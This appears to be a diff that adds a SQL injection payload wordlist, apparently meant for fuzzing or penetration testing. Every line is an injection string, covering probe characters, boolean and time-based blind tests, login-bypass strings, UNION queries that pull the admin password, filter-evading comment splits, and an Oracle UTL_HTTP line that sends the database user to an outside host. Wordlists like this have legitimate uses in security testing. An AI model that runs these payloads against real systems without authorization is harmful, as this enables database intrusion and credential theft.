@@ -1,0 +1,30 @@
+'
+"
+/
+/*
+#
+)
+(
+)'
+('
+and 1=1
+and 1=2
+and 1>2
+and 1<2
+10 AND 1=1
+1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1
+1'%20or%20'1'%20=%20'1'))/*&password=foo
+1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&password=foo
+10 ORDER BY 10--
+10 UNION SELECT 1,null,null--
+10 UNION SELECT 1,1,null--
+99999 UNION SELECT 1,1,null--
+1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1
+97 AND '1'='1
+97' AND '1'='1
+1' AND '1' = '2
+10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--
+10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--
+' UNION SELECT password FROM Users WHERE name='admin'--
+'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--
+'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--
